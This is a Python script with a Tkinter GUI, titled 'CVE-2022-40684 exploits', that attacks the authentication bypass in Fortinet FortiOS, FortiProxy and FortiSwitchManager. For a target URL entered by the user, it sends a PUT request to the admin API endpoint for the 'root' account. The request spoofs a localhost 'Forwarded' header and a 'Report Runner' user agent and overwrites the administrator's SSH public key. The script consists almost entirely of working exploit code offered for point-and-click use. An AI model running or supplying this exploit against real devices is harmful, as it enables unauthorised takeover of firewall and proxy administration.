'''
An authentication bypass using an alternate path or channel [CWE-288] in Fortinet FortiOS version 7.2.0 through 7.2.1 and 7.0.0 through 7.0.6, FortiProxy version 7.2.0 and version 7.0.0 through 7.0.6 and FortiSwitchManager version 7.2.0 and 7.0.0 allows an unauthenticated atttacker to perform operations on the administrative interface via specially crafted HTTP or HTTPS requests.
'''
import requests
import argparse
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def unauthenticated():
    root = tkinter.Tk()
    root.title("CVE-2022-40684 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        target = inp
        username = "root"
        ssh_public_key = "01212000"

# Prepare headers
        headers = {
            'User-Agent': 'Report Runner',
            'Content-Type': 'application/json',
            'Forwarded': 'for="[127.0.0.1]:8000";by="[127.0.0.1]:9000";'
        }

# Prepare data
        data = {
            "ssh-public-key1": ssh_public_key
        }

        url = f"{target}/api/v2/cmdb/system/admin/{username}"
        response = requests.put(url, headers=headers, json=data)
        if response.status_code == 200 and 'SSH' in response.text:
            scroll_y = Scrollbar(root, orient=VERTICAL)
            txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
            scroll_y.pack(side=RIGHT, fill=Y)
            scroll_y.config(command=txtarea.yview)
            txtarea.insert(END, f"[+] Successful exploit for {username} at {url}")
            txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")
            txtarea.pack(fill=BOTH, expand=True)
            txtarea.configure(state ='disabled')
        else:
            scroll_y = Scrollbar(root, orient=VERTICAL)
            txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
            scroll_y.pack(side=RIGHT, fill=Y)
            scroll_y.config(command=txtarea.yview)
            txtarea.insert(END, f"[-] Failed exploit for {username} at {url}")
            txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")
            txtarea.pack(fill=BOTH, expand=True)
            txtarea.configure(state ='disabled')

    Hacher = Label(root, text="An authentication bypass using an alternate path or channel [CWE-288] in Fortinet FortiOS\n version 7.2.0 through 7.2.1 and 7.0.0 through 7.0.6, FortiProxy version 7.2.0 and version 7.0.0 through\n 7.0.6 and FortiSwitchManager version 7.2.0 and 7.0.0 allows an unauthenticated atttacker to perform operations\n on the administrative interface via specially crafted HTTP or HTTPS requests.\n\nEnter url or domin https://www.example.com : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()
